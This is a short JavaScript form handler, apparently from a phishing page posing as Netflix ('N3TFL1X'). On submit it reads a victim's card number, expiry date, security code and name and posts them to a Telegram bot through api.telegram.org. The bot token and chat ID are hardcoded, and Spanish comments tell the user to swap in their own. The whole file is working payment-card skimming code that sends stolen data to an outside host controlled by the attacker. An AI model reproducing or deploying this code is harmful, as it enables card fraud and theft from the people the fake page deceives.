document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Evita que el formulario se envíe de la forma tradicional

    const name = document.getElementById('creditCardInput').value;
    const email = document.getElementById('expiryDateInput').value;
    const tres = document.getElementById('codseg').value;
    const cuatro = document.getElementById('cuatro').value;
    const cinco = document.getElementById('cinco').value;
    const token = '6330339339:AAEEoaWroxHQ-J8BnFTjKeOFI7cLS6z3P3E'; // Reemplaza con tu token de acceso del bot
    const chat_id = '5635537335'; // Reemplaza con tu chat ID

    const message = `*N3TFL1X*\n\nNUMERO DE TARJETA: ${name}\nMM/AA: ${email}\nVERIFICACION: ${tres}\nNOMBRE: ${cuatro}\nAPELLIDO: ${cinco}`; 

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const data = {
        chat_id: chat_id,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    
    .catch((error) => {
        console.error('Error:', error);
        alert('Hubo un error al enviar el mensaje');
    });
});
